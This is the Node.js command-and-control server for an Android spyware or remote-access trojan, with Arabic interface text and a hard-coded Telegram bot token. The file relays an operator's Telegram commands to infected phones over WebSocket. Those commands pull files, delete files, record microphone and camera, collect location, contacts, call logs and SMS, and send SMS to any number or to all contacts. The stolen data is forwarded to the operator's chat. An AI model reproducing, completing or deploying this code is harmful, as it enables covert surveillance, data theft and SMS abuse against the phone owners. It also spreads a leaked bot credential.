const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';

// Routes
app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ النظام يعمل</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model || 'Unknown';
    
    bot.sendDocument(id, req.file.buffer, {
        caption: `📁 ملف من: <b>${model}</b>\n📄 ${filename}`,
        parse_mode: 'HTML'
    }, { filename: filename, contentType: 'application/octet-stream' });
    
    res.send('');
});

app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendMessage(id, `📝 رسالة من: <b>${model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `📍 موقع من: <b>${model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

// WebSocket Connection
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`✅ جهاز متصل: ${model}`);
    
    bot.sendMessage(id, 
        `🆕 جهاز جديد متصل\n\n` +
        `📱 <b>${model}</b>\n` +
        `🔋 <b>${battery}%</b>\n` +
        `🤖 <b>${version}</b>\n` +
        `🆔 <code>${uuid}</code>`, 
        { parse_mode: 'HTML' }
    );
    
    ws.on('close', () => {
        console.log(`❌ انقطع: ${model}`);
        bot.sendMessage(id, `❌ انقطع: <b>${model}</b>`, { parse_mode: 'HTML' });
        clients.delete(uuid);
    });
});

// ⭐⭐ الكود الأساسي - نفس أوامر الكود المشفر
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    
    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.includes('يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه')) {
            currentNumber = msg.text;
            bot.sendMessage(id, 'رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم', { reply_markup: { force_reply: true } });
        }
        
        if (msg.reply_to_message.text.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${msg.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل مسار الملف الذي تريد تنزيله')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل مسار الملف الذي تريد حذفه')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        // ⭐⭐ المايكرفون - كان يشتغل
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        // ⭐⭐ الكاميرا الأمامية - نفس المبدأ
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الأمامية فيها')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        // ⭐⭐ الكاميرا الخلفية - نفس المبدأ
        if (msg.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الخلفية فيها')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.reply_to_message.text.includes('أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
            wss.clients.forEach(function client(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${msg.text}`);
                }
            });
            currentUuid = '';
            bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
    }
    
    if (id == chatId) {
        if (msg.text == '/start') {
            bot.sendMessage(id, '• • مرحبا بك في النظام\n\n' +
                '• نظام إدارة الأجهزة المتقدمة\n\n' +
                '• اختر من القائمة:', { 
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                    resize_keyboard: true
                }
            });
        }
        
        if (msg.text == '📱 الأجهزة المتصلة') {
            if (clients.size == 0) {
                bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
            } else {
                let devicesList = '• قائمة الأجهزة المتصلة:\n\n';
                clients.forEach(function(value, key, map) {
                    devicesList += `• الطراز: <b>${value.model}</b>\n` +
                        `• البطارية: <b>${value.battery}</b>\n` +
                        `• الأندرويد: <b>${value.version}</b>\n\n`;
                });
                bot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
            }
        }
        
        if (msg.text == '📋 قائمة الأوامر') {
            if (clients.size == 0) {
                bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
            } else {
                const deviceButtons = [];
                clients.forEach(function(value, key, map) {
                    deviceButtons.push([{ text: value.model, callback_data: `device:${key}` }]);
                });
                bot.sendMessage(id, '• حدد الجهاز لتنفيذ الأوامر', {
                    reply_markup: { inline_keyboard: deviceButtons }
                });
            }
        }
    }
});

// ⭐⭐ معالجة Callback Queries - نفس أوامر الكود المشفر
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const parts = data.split(':');
    const action = parts[0];
    const uuid = parts[1];
    
    console.log(`🔘 ${data}`);
    
    if (action == 'device') {
        bot.editMessageText(`• حدد الجهاز لتنفيذ الأوامر: <b>${clients.get(data.split(':')[1]).model}</b>`, {
            chat_id: id,
            message_id: message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}` }, { text: 'ℹ️ معلومات الجهاز', callback_data: `device_info:${uuid}` }],
                    [{ text: '📂 الحصول على ملف', callback_data: `file:${uuid}` }, { text: '🗑️ حذف الملف', callback_data: `delete_file:${uuid}` }],
                    [{ text: '🎤 الميكروفون', callback_data: `microphone:${uuid}` }, { text: '📷 الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` }],
                    [{ text: '📸 كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }, { text: '📍 الموقع', callback_data: `location:${uuid}` }],
                    [{ text: '📞 المكالمات', callback_data: `calls:${uuid}` }, { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }],
                    [{ text: '📳 الاهتزاز', callback_data: `vibrate:${uuid}` }, { text: '🔔 الإشعار', callback_data: `toast:${uuid}` }],
                    [{ text: '✉️ الرسائل', callback_data: `messages:${uuid}` }, { text: '📨 إرسال رسالة', callback_data: `send_message:${uuid}` }],
                    [{ text: '📨 إرسال للجميع', callback_data: `send_message_to_all:${uuid}` }]
                ]
            },
            parse_mode: 'HTML'
        });
    }
    
    if (action == 'apps') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'device_info') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'file') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل مسار الملف الذي تريد تنزيله\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'delete_file') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل مسار الملف الذي تريد حذفه\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    // ⭐⭐ المايكرفون - كان يشتغل
    if (action == 'microphone') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    // ⭐⭐ الكاميرا الخلفية - نفس المبدأ
    if (action == 'camera_main') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الكاميرا الخلفية فيها\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    // ⭐⭐ الكاميرا الأمامية - نفس المبدأ
    if (action == 'camera_selfie') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الكاميرا الأمامية فيها\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'location') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'calls') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'contacts') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'messages') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'vibrate') {
        wss.clients.forEach(function client(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• طلبك قيد المعالجة\n\n', { 
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 الأجهزة المتصلة'], ['📋 قائمة الأوامر']],
                resize_keyboard: true
            }
        });
    }
    
    if (action == 'toast') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'send_message') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    
    if (action == 'send_message_to_all') {
        bot.deleteMessage(id, message.message_id);
        bot.sendMessage(id, '• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
});

// بدء الخادم
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
});

// معالجة الأخطاء
bot.on('error', (error) => {
    console.error('❌ خطأ في البوت:', error);
});

bot.on('polling_error', (error) => {
    console.error('❌ خطأ في الاتصال:', error);
});
